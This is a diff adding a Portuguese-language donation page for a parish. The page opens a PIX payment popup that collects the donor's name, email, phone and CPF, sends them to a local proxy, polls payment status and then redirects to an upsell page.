@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Processar Doação</title>
+    <style>
+        /* Estilos para centralizar o botão na página */
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f0f2f5;
+            font-family: sans-serif;
+        }
+
+        /* Estilos do botão de doação */
+        .btn-doar {
+            display: inline-block;
+            background-color: #28a745;
+            color: white;
+            padding: 18px 40px;
+            font-size: 22px;
+            font-weight: bold;
+            border-radius: 8px;
+            text-decoration: none;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn-doar:hover {
+            background-color: #218838;
+            transform: scale(1.05);
+        }
+    </style>
+</head>
+<body>
+
+    <a href="#" class="btn-doar">Fazer Doação</a>
+
+    <script src="https://cdn.jsdelivr.net/gh/davidshimjs/qrcodejs/qrcode.min.js"></script>
+    <script>
+    (function () {
+      const PROXY_URL = './proxy_tribopay.php';
+      const utms = Object.fromEntries(new URLSearchParams(window.location.search));
+      const CHECKOUT = { "backgroundColor": "#ffffff", "buttonColor": "#24eb8e", "buttonText": "Doar Agora com PIX", "title": "Complete sua Doação", "subtitle": "Com sua doação de R$49,90, você ajuda a Paróquia São Domingos a oferecer comida, agasalho e dignidade. Preencha os campos abaixo para continuar.", "fields": { "name": true, "email": true, "phone": true, "document": true, "cep": false, "street": false, "number": false, "complement": false, "neighborhood": false, "city": false, "state": false }, "timerMinutes": 0, "timerBackgroundColor": "rgba(255, 255, 255, 0.1)", "timerTextColor": "#ffffff", "amount": 4990, "directPix": false, "triggerSelector": ".btn-doar", "pixModalTitle": "Pagamento via PIX", "pixModalCopyButtonText": "Copiar código PIX", "pixModalBackgroundColor": "#FFFFFF", "pixModalTextColor": "#1f2937", "pixModalButtonColor": "#00c27a", "pixModalButtonTextColor": "#FFFFFF", "pixModalValueText": "💰 Valor:", "pixModalExpirationText": "🕒 Válido até:", "pixModalSecurePaymentText": "Pagamento seguro via PIX", "pixModalInfoTextColor": "#0f172a", "pixModalSecurePaymentTextColor": "#00c27a", "pixModalInputBackgroundColor": "#f9fafb", "pixModalInputBorderColor": "#d1d5db", "pixModalInputTextColor": "#374151", "pixExpirationMinutes": 5, "popupTextColor": "#10c17d", "popupSubtitleColor": "#000000", "popupPriceColor": "#24eb8e", "popupInputBackgroundColor": "#e00000", "popupInputBorderColor": "rgba(33, 191, 235, 0.3)", "popupInputTextColor": "#ffffff", "facebookPixelId": "", "upsellUrl": "https://preview--domingos-agradece.lovable.app/", "backRedirectUrl": "" };
+
+      let timeLeft = CHECKOUT.timerMinutes * 60;
+      let timerInterval = null;
+
+      function formatCurrency(value) {
+        return (value / 100).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+      }
+
+      function formatTime(seconds) {
+        if (seconds <= 0) return "00:00";
+        const m = String(Math.floor(seconds / 60)).padStart(2, '0');
+        const s = String(seconds % 60).padStart(2, '0');
+        return m + ':' + s;
+      };
+
+      function createPopup() {
+        const popupContainer = document.createElement('div');
+        popupContainer.id = 'paradise-popup-overlay';
+        popupContainer.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background-color:rgba(0,0,0,0.7);display:none;align-items:center;justify-content:center;z-index:9999;backdrop-filter:blur(4px);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;';
+
+        let formFieldsHtml = '';
+        if (!CHECKOUT.directPix) {
+          const inputStyle = 'width:100%;padding:12px;margin-bottom:10px;border-radius:8px;box-sizing:border-box;background-color: ' + (CHECKOUT.popupInputBackgroundColor || '#ffffff') + ';border: 1px solid ' + (CHECKOUT.popupInputBorderColor || '#cccccc') + ';color: ' + (CHECKOUT.popupInputTextColor || 'black') + ';';
+          formFieldsHtml =
+            (CHECKOUT.fields.name ? '<input type="text" name="name" placeholder="Nome Completo" required style="' + inputStyle + '">' : '') +
+            (CHECKOUT.fields.email ? '<input type="email" name="email" placeholder="Seu Melhor E-mail" required style="' + inputStyle + '">' : '') +
+            (CHECKOUT.fields.phone ? '<input type="tel" name="phone_number" placeholder="Telefone (WhatsApp)" required style="' + inputStyle + '">' : '') +
+            (CHECKOUT.fields.document ? '<input type="text" name="document" placeholder="CPF (apenas números)" maxlength="11" required style="' + inputStyle + '">' : '');
+        }
+
+        const timerHtml = CHECKOUT.timerMinutes > 0 ?
+          '<div id="paradise-popup-timer" style="font-size:1.25rem;font-weight:bold;margin-bottom:12px;display:inline-block;padding:4px 12px;border-radius:8px;background-color:' + (CHECKOUT.timerBackgroundColor || 'rgba(255,255,255,0.1)') + ';color:' + (CHECKOUT.timerTextColor || 'white') + ';">' +
+          formatTime(timeLeft) +
+          '</div>' : '';
+
+        popupContainer.innerHTML =
+          '<div id="paradise-popup-content" style="background-color:' + CHECKOUT.backgroundColor + ';color:' + (CHECKOUT.popupTextColor || 'black') + ';padding:24px;border-radius:24px;width:90%;max-width:380px;text-align:center;position:relative;box-sizing:border-box;">' +
+          '<button id="paradise-popup-close" style="position:absolute;top:10px;right:10px;background:transparent;border:none;color:' + (CHECKOUT.popupTextColor || 'black') + ';font-size:24px;cursor:pointer;line-height:1;">&times;</button>' +
+          timerHtml +
+          '<h2 style="font-size:1.5rem;font-weight:bold;margin:0 0 4px 0;color:inherit;">' + CHECKOUT.title + '</h2>' +
+          '<p style="color:' + (CHECKOUT.popupSubtitleColor || '#333333') + ';font-size:0.875rem;margin:0 0 16px 0;">' + CHECKOUT.subtitle + '</p>' +
+          '<p style="font-size:2rem;font-weight:bold;color:' + (CHECKOUT.popupPriceColor || '#28a745') + ';margin:0 0 16px 0;">' + formatCurrency(CHECKOUT.amount) + '</p>' +
+          '<form id="paradise-popup-form">' +
+          formFieldsHtml +
+          '<button type="submit" id="paradise-popup-pay-btn" style="width:100%;padding:14px;background-color:' + CHECKOUT.buttonColor + ';color:white;border:none;border-radius:12px;font-weight:bold;font-size:1rem;cursor:pointer;display:flex;align-items:center;justify-content:center;">' +
+          '<span>' + CHECKOUT.buttonText + '</span>' +
+          '</button>' +
+          '</form>' +
+          '</div>';
+        document.body.appendChild(popupContainer);
+
+        popupContainer.addEventListener('click', (e) => { if (e.target === popupContainer) closePopup(); });
+        document.getElementById('paradise-popup-close').addEventListener('click', closePopup);
+        document.getElementById('paradise-popup-form').addEventListener('submit', handleFormSubmit);
+        
+        const docInput = popupContainer.querySelector('input[name="document"]');
+        if (docInput) {
+          docInput.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, "");
+            value = value.substring(0, 11);
+            e.target.value = value;
+          });
+        }
+      }
+
+      function startTimer() {
+        if (CHECKOUT.timerMinutes <= 0) return;
+        const timerEl = document.getElementById('paradise-popup-timer');
+        if (timerInterval) clearInterval(timerInterval);
+        timerInterval = setInterval(() => {
+          timeLeft--;
+          if (timerEl) timerEl.textContent = formatTime(timeLeft);
+          if (timeLeft <= 0) {
+            clearInterval(timerInterval);
+            const payBtn = document.getElementById('paradise-popup-pay-btn');
+            if (payBtn) {
+              payBtn.disabled = true;
+              payBtn.style.opacity = '0.5';
+              payBtn.textContent = 'Oferta Encerrada';
+            }
+          }
+        }, 1000);
+      }
+
+      async function handleFormSubmit(e) {
+        e.preventDefault();
+        const form = e.target;
+        if (!CHECKOUT.directPix && !form.checkValidity()) {
+          form.reportValidity();
+          return;
+        }
+
+        const payButton = document.getElementById('paradise-popup-pay-btn');
+        payButton.disabled = true;
+        payButton.innerHTML = '<div style="border: 2px solid #f3f3f3; border-top: 2px solid #fff; border-radius: 50%; width: 18px; height: 18px; animation: spin 1s linear infinite; display: inline-block;"></div><span style="margin-left:8px;">Processando...</span>';
+
+        let customerData = {};
+        if (!CHECKOUT.directPix) {
+          const elements = form.elements;
+          for (let i = 0; i < elements.length; i++) {
+            if (elements[i].name) {
+              customerData[elements[i].name] = elements[i].value;
+            }
+          }
+        }
+
+        const payload = {
+          customer: customerData,
+          utms: utms
+        };
+
+        try {
+          const response = await fetch(PROXY_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+          const result = await response.json();
+          if (!response.ok) {
+            throw new Error(result.message || result.error || 'Ocorreu um erro.');
+          }
+          showPixModal(result);
+          closePopup(true);
+        } catch (error) {
+          alert('Erro: ' + error.message);
+          payButton.disabled = false;
+          payButton.textContent = CHECKOUT.buttonText;
+        }
+      }
+
+      function showPopup() {
+        const popup = document.getElementById('paradise-popup-overlay');
+        if (!popup) {
+          createPopup();
+          showPopup();
+          return;
+        }
+        popup.style.display = 'flex';
+        document.body.style.overflow = 'hidden';
+        timeLeft = CHECKOUT.timerMinutes * 60;
+        startTimer();
+      }
+
+      function closePopup(keepTimerState = false) {
+        const popup = document.getElementById('paradise-popup-overlay');
+        if (popup) popup.style.display = 'none';
+        document.body.style.overflow = '';
+        if (timerInterval) clearInterval(timerInterval);
+        if (!keepTimerState) timeLeft = CHECKOUT.timerMinutes * 60;
+      }
+
+      function startPopupPaymentChecker(hash) {
+        if (window._popupPaymentChecker) clearInterval(window._popupPaymentChecker);
+
+        window._popupPaymentChecker = setInterval(async () => {
+          try {
+            const res = await fetch(`${PROXY_URL}?action=check_status&hash=${hash}`);
+            const data = await res.json();
+            if (data && data.payment_status === 'paid') {
+              clearInterval(window._popupPaymentChecker);
+
+              if (typeof fbq === 'function' && CHECKOUT.facebookPixelId) {
+                fbq('track', 'Purchase', { value: CHECKOUT.amount / 100, currency: 'BRL' });
+              }
+
+              if (CHECKOUT.upsellUrl) {
+                const upsellUrl = CHECKOUT.upsellUrl;
+                const params = new URLSearchParams(utms);
+                params.append('fpay', hash);
+                const newQueryString = params.toString();
+                const finalUrl = upsellUrl + (upsellUrl.includes('?') ? '&' : '?') + newQueryString;
+                window.location.href = finalUrl;
+              } else {
+                let pixModal = document.querySelector('#paradise-pix-modal');
+                if (pixModal) {
+                  const modalContent = pixModal.querySelector('div');
+                  if (modalContent) modalContent.innerHTML = '<h2 style="font-size:2rem;font-weight:bold;color:green;">Pagamento Aprovado!</h2><p>Obrigado!</p>';
+                }
+              }
+            }
+          } catch (e) {
+            console.error('Popup payment check failed:', e);
+          }
+        }, 5000);
+      }
+
+      function showPixModal(result) {
+        let pixModal = document.getElementById('paradise-pix-modal');
+        if (pixModal) pixModal.remove();
+
+        const pixCode = result?.pix?.pix_qr_code;
+        const transactionHash = result?.hash;
+        let expirationDate = result?.pix?.expiration_date;
+
+        if (!pixCode) {
+            alert('Não foi possível gerar o código PIX. Verifique os dados e tente novamente.');
+            return;
+        }
+
+        pixModal = document.createElement('div');
+        pixModal.id = 'paradise-pix-modal';
+        pixModal.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:9999;display:flex;justify-content:center;align-items:center;animation:backdropFadeIn 0.3s ease-out forwards; font-family: Inter, sans-serif;';
+
+        if (!expirationDate && CHECKOUT.pixExpirationMinutes > 0) {
+          expirationDate = new Date(Date.now() + CHECKOUT.pixExpirationMinutes * 60 * 1000);
+        }
+
+        const expirationString = expirationDate ? new Date(expirationDate).toLocaleString('pt-BR', {
+          day: '2-digit', month: '2-digit', year: 'numeric',
+          hour: '2-digit', minute: '2-digit', second: '2-digit'
+        }).replace(',', '') : '--';
+
+        const modalTitleHTML = CHECKOUT.pixModalTitle ? '<h2 style="margin:0 0 16px;font-size:20px;line-height:1.4;color:' + (CHECKOUT.pixModalTextColor || '#111827') + ';">' + CHECKOUT.pixModalTitle + '</h2>' : '';
+        const modalValueHTML = CHECKOUT.pixModalValueText ? '<p style="margin:8px 0;">' + CHECKOUT.pixModalValueText + ' <strong>' + formatCurrency(CHECKOUT.amount) + '</strong></p>' : '';
+        const modalExpirationHTML = CHECKOUT.pixModalExpirationText ? '<p style="margin:8px 0;">' + CHECKOUT.pixModalExpirationText + ' <span>' + expirationString + '</span></p>' : '';
+        const modalSecurePaymentHTML = CHECKOUT.pixModalSecurePaymentText ? '<p style="margin:12px 0 0;font-weight:bold;color:' + (CHECKOUT.pixModalSecurePaymentTextColor || '#00c27a') + ';">' + CHECKOUT.pixModalSecurePaymentText + '</p>' : '';
+
+        pixModal.innerHTML =
+          '<div style="background:' + (CHECKOUT.pixModalBackgroundColor || '#ffffff') + ';padding:32px;border-radius:16px;max-width:380px;width:90%;box-shadow:0 8px 24px rgba(0,0,0,0.2);position:relative;animation:popupSlideIn 0.3s ease-out forwards;text-align: center;">' +
+          '<button id="paradise-pix-modal-close" style="position:absolute;top:10px;right:15px;font-size:24px;color:#9ca3af;background:none;border:none;cursor:pointer;">&times;</button>' +
+          modalTitleHTML +
+          '<div style="display:flex;justify-content:center;margin-bottom:16px;"><div id="paradise-pix-qrcode" style="padding: 4px; background: white; border-radius: 4px; line-height: 0;"></div></div>' +
+          '<input id="paradise-pix-code-input" type="text" readonly value="' + pixCode + '" style="width:100%;box-sizing:border-box;padding:12px;font-size:14px;margin-bottom:12px;border-radius:8px;text-align:center;font-family:monospace;background-color:' + (CHECKOUT.pixModalInputBackgroundColor || '#f9fafb') + ';border:1px solid ' + (CHECKOUT.pixModalInputBorderColor || '#d1d5db') + ';color:' + (CHECKOUT.pixModalInputTextColor || '#374151') + ';">' +
+          '<button id="paradise-pix-copy-btn" style="border:none;width:100%;padding:14px 20px;border-radius:8px;font-weight:600;font-size:15px;cursor:pointer;transition: filter 0.2s ease;margin-bottom:16px;background:' + (CHECKOUT.pixModalButtonColor || '#00c27a') + ';color:' + (CHECKOUT.pixModalButtonTextColor || '#ffffff') + ';">' + (CHECKOUT.pixModalCopyButtonText || 'Copiar código PIX') + '</button>' +
+          '<div style="font-size:14px;line-height:1.5;text-align: center;color:' + (CHECKOUT.pixModalInfoTextColor || '#0f172a') + ';">' +
+          modalValueHTML +
+          modalExpirationHTML +
+          modalSecurePaymentHTML +
+          '</div>' +
+          '</div>';
+
+        document.body.appendChild(pixModal);
+
+        const qrContainer = document.getElementById('paradise-pix-qrcode');
+        if (qrContainer && typeof QRCode !== 'undefined') {
+          new QRCode(qrContainer, {
+            text: pixCode,
+            width: 184,
+            height: 184,
+            colorDark: "#000000",
+            colorLight: "#ffffff",
+            correctLevel: QRCode.CorrectLevel.M
+          });
+        }
+
+        if (transactionHash) {
+          startPopupPaymentChecker(transactionHash);
+        }
+
+        const closeAndClear = () => {
+          pixModal.remove();
+          if (window._popupPaymentChecker) clearInterval(window._popupPaymentChecker);
+        };
+
+        pixModal.addEventListener('click', (e) => { if (e.target === pixModal) closeAndClear(); });
+        document.getElementById('paradise-pix-modal-close').addEventListener('click', closeAndClear);
+        document.getElementById('paradise-pix-copy-btn').addEventListener('click', (e) => {
+          const inputField = document.getElementById('paradise-pix-code-input');
+          navigator.clipboard.writeText(inputField.value).then(() => {
+            const btn = e.target;
+            const originalText = btn.textContent;
+            btn.textContent = 'Copiado!';
+            setTimeout(() => { btn.textContent = originalText; }, 2000);
+          });
+        });
+      }
+
+      document.addEventListener('DOMContentLoaded', () => {
+        const style = document.createElement('style');
+        style.innerHTML = `
+           @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
+           @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+           @keyframes backdropFadeIn { from { opacity: 0; } to { opacity: 1; } }
+           @keyframes popupSlideIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
+        `;
+        document.head.appendChild(style);
+
+        document.querySelectorAll(CHECKOUT.triggerSelector).forEach(el => {
+          el.addEventListener('click', (e) => {
+            e.preventDefault();
+            showPopup();
+          });
+        });
+      });
+    })();
+    </script>
+
+</body>
+</html>
